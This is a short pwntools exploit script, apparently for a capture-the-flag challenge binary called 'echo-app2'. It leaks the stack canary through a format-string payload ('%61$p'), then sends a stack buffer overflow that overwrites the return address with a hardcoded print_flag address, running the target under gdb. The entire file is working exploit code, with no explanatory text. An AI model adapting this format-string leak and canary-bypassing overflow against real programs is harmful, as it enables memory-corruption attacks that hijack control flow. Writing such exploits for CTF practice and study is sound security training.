from pwn import *

gdbscript = '''
break *do_echo
break *0x555555555229  # print_flag address
commands 1
    x/100gx $rsp    # Examine stack when hitting do_echo
    continue
end
continue
'''

context.arch = 'amd64'

p = gdb.debug('./echo-app2', gdbscript=gdbscript)
leak_payload = b'%61$p'

p.sendline(leak_payload)

# Receive the output and filter to get the address
addr = p.recvn(18).strip()
hex_addr = addr.split(b'0x')[-1]  # Split by '0x' and get the last portion

try:
    canary = int(hex_addr, 16)
except ValueError:
    print(f"Received unexpected data: {addr}")
    canary = 0  # Use a placeholder or handle accordingly

print_flag = 0x555555555229
print(f"Canary: {canary}")
payload = b'A' * 264 + p64(canary) + p64(print_flag)
p.sendline(payload)

p.interactive()
